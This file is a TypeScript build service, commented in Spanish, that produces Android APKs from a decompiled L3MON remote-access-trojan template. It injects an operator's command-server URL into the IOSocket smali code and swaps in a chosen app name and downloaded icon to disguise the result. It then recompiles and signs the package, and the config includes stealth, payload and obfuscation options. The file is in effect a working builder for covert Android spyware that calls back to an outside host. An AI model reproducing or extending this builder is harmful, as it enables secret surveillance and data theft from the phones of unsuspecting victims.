import { execSync } from "child_process";
import { existsSync, mkdirSync, writeFileSync, readFileSync, renameSync, statSync, readdirSync, copyFileSync } from "fs";
import { join, resolve, dirname, basename } from "path";
import { fileURLToPath } from "url";
import { getDb } from "./db";
import { apkBuilds } from "../drizzle/schema";
import { eq } from "drizzle-orm";
import axios from "axios";


/**
 * Servicio de compilación de APK basado en el concepto L3MON
 * Utiliza Apktool para re-compilar y un firmador automático
 */

export interface CompilationConfig {
  buildId: number;
  appName: string;
  packageName: string;
  versionCode: number;
  versionName: string;
  stealthMode: boolean;
  enableSSL: boolean;
  ports: number[];
  iconPath?: string;
  iconUrl?: string; // New field for remote icons
  payloadCode: string;
  obfuscate: boolean;
  targetArchitectures: string[];
}


export interface BuildResult {
  success: boolean;
  buildId: number;
  apkPath?: string;
  error?: string;
  logs: string[];
  compilationTime: number;
}

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

class APKCompiler {
  private projectRoot: string;
  private assetsDir: string;
  private buildDir: string;
  private apktoolPath: string;
  private signerPath: string;

  constructor() {
    this.projectRoot = resolve(join(__dirname, ".."));
    this.assetsDir = join(this.projectRoot, "server", "assets");
    this.buildDir = join(this.projectRoot, "apk-builds");
    this.apktoolPath = join(this.assetsDir, "apktool.jar");
    this.signerPath = join(this.assetsDir, "sign.jar");

    if (!existsSync(this.buildDir)) {
      mkdirSync(this.buildDir, { recursive: true });
    }
  }

  /**
   * Preparar el proyecto temporal para compilar
   */
  private async prepareProject(config: CompilationConfig, logs: string[]): Promise<string> {
    const buildIdDir = join(this.buildDir, `build-${config.buildId}`);
    const tempProjectDir = join(buildIdDir, "project");

    if (existsSync(buildIdDir)) {
      execSync(`powershell -Command "Remove-Item -Path '${buildIdDir}' -Recurse -Force"`);
    }
    mkdirSync(tempProjectDir, { recursive: true });

    // Copiar el template decompilado
    const templateDir = join(this.assetsDir, "apk-template");
    execSync(`powershell -Command "Copy-Item -Path '${templateDir}\\*' -Destination '${tempProjectDir}' -Recurse -Force"`);

    // 1. Inyectar URL en IOSocket.smali
    const ioSocketPath = join(tempProjectDir, "smali", "com", "etechd", "l3mon", "IOSocket.smali");
    if (existsSync(ioSocketPath)) {
      let content = readFileSync(ioSocketPath, "utf8");
      
      let serverUrl = config.payloadCode || process.env.API_URL || "http://192.168.200.9:3001";
      if (!serverUrl.startsWith("http")) serverUrl = `http://${serverUrl}`;
      
      try {
          const urlObj = new URL(serverUrl);
          // Si el usuario puso localhost o 127.0.0.1, forzamos la IP de la red para que el APK conecte
          if (urlObj.hostname === "localhost" || urlObj.hostname === "127.0.0.1") {
            const os = await import("os");
            const networkInterfaces = os.networkInterfaces();
            const localIp = Object.values(networkInterfaces)
              .flat()
              .find(iface => iface?.family === 'IPv4' && !iface.internal)?.address || "192.168.200.9";
            serverUrl = `${urlObj.protocol}//${localIp}:${urlObj.port || "3001"}`;
          }
      } catch (e) {
          serverUrl = "http://192.168.200.9:3001";
      }

      // Replace ANY existing URL pattern in the Smali file
      const oldPattern = /http:\/\/[^\/]+\/l3mon\?model=/g;
      const newUrl = `${serverUrl}/l3mon?model=`;
      content = content.replace(oldPattern, newUrl);

      console.log(`[APKCompiler] Injecting Server URL: ${serverUrl}/l3mon`);
      writeFileSync(ioSocketPath, content);
    }

    // 2. Modificar App Name en strings.xml
    const stringsPath = join(tempProjectDir, "res", "values", "strings.xml");
    if (existsSync(stringsPath)) {
      try {
        let content = readFileSync(stringsPath, "utf8");
        content = content.replace(/<string name="app_name">.*?<\/string>/, `<string name="app_name">${config.appName}</string>`);
        writeFileSync(stringsPath, content);
      } catch (e) {
        console.warn("[APKCompiler] Error actualizando app_name:", e);
      }
    }

    // 3. [NUEVO] Inyectar Icono personalizado
    if (config.iconUrl) {
      try {
        logs.push(`[${new Date().toISOString()}] Descargando icono personalizado desde URL...`);
        const response = await axios.get(config.iconUrl, { responseType: 'arraybuffer' });
        const iconBuffer = Buffer.from(response.data);
        const tempIconPath = join(buildIdDir, "custom_icon.png");
        writeFileSync(tempIconPath, iconBuffer);

        // Reemplazar en todos los directorios mipmap
        const resDir = join(tempProjectDir, "res");
        const mipmapDirs = readdirSync(resDir).filter(d => d.startsWith("mipmap-"));
        
        for (const dir of mipmapDirs) {
          const targetDir = join(resDir, dir);
          const iconTargets = ["ic_launcher.png", "ic_launcher_round.png"];
          for (const target of iconTargets) {
            const targetPath = join(targetDir, target);
            if (existsSync(targetPath)) {
              writeFileSync(targetPath, iconBuffer);
            }
          }
        }
        logs.push(`[${new Date().toISOString()}] Icono personalizado inyectado en todas las densidades.`);
      } catch (e) {
        logs.push(`[WARN] Error descargando el icono: ${e instanceof Error ? e.message : String(e)}`);
      }
    }

    return tempProjectDir;
  }


  async compileAPK(config: CompilationConfig): Promise<BuildResult> {
    const startTime = Date.now();
    const logs: string[] = [];
    const buildIdDir = join(this.buildDir, `build-${config.buildId}`);

    try {
      logs.push(`[${new Date().toISOString()}] Iniciando construcción Platinum (Smali Hooking)...`);
      logs.push(`Configuración: ${config.appName} | ${config.packageName}`);
      
      const projectDir = await this.prepareProject(config, logs);
      logs.push(`Template inyectado correctamente en: ${projectDir}`);


      // Compilar con Apktool
      const unsignedApk = join(buildIdDir, "unsigned.apk");
      logs.push(`[${new Date().toISOString()}] Re-compilando Smali con Apktool...`);
      execSync(`java -jar "${this.apktoolPath}" b "${projectDir}" -o "${unsignedApk}"`, { stdio: "pipe" });

      // Firmar y Alinear con Uber Apk Signer
      logs.push(`[${new Date().toISOString()}] Firmando paquete con uber-apk-signer...`);
      const uberSignerPath = join(this.assetsDir, "uber-apk-signer.jar");
      execSync(`java -jar "${uberSignerPath}" -a "${unsignedApk}" -o "${buildIdDir}" 2>&1`, { stdio: "pipe" });
      
      const signedTempApk = join(buildIdDir, "unsigned-aligned-debugSigned.apk");
      // Renombrar al nombre limpio de la app
      const finalSignedApk = join(buildIdDir, `${config.appName.replace(/[^a-zA-Z0-9]/g, "_")}.apk`);
      if (existsSync(signedTempApk)) {
          renameSync(signedTempApk, finalSignedApk);
      }

      if (!existsSync(finalSignedApk)) {
        throw new Error("Error crítico: El APK final no se generó o falló la firma.");
      }

      logs.push(`[${new Date().toISOString()}] ¡Construcción Exitosa!`);
      const compilationTime = Date.now() - startTime;
      
      await this.updateBuildStatus(config.buildId, "ready", finalSignedApk, logs);

      return {
        success: true,
        buildId: config.buildId,
        apkPath: finalSignedApk,
        logs,
        compilationTime,
      };

    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : String(error);
      logs.push(`[ERROR] ${errorMsg}`);
      await this.updateBuildStatus(config.buildId, "failed", undefined, logs, errorMsg);
      return { success: false, buildId: config.buildId, error: errorMsg, logs, compilationTime: Date.now() - startTime };
    }
  }

  private async updateBuildStatus(
    buildId: number,
    status: "building" | "ready" | "failed" | "expired",
    apkPath?: string,
    logs?: string[],
    error?: string
  ): Promise<void> {
    const db = await getDb();
    if (!db) return;
    try {
      const updateData: any = { status };
      // [PLATINUM FIX] Don't overwrite the API URL with the local file path
      // if (apkPath) updateData.apkUrl = apkPath; 
      
      // Write logs to the correct column, safely truncated to 4000 chars
      if (logs) updateData.buildLogs = logs.join("\n").substring(0, 4000);
      await db.update(apkBuilds).set(updateData).where(eq(apkBuilds.id, buildId));
    } catch (err) {
      console.error("[APKCompiler] Error actualizando estado en DB:", err);
    }
  }

  getAPKInfo(apkPath: string) {
    const stats = statSync(apkPath);
    return { size: stats.size, path: apkPath, name: basename(apkPath) };
  }
}

export const apkCompiler = new APKCompiler();
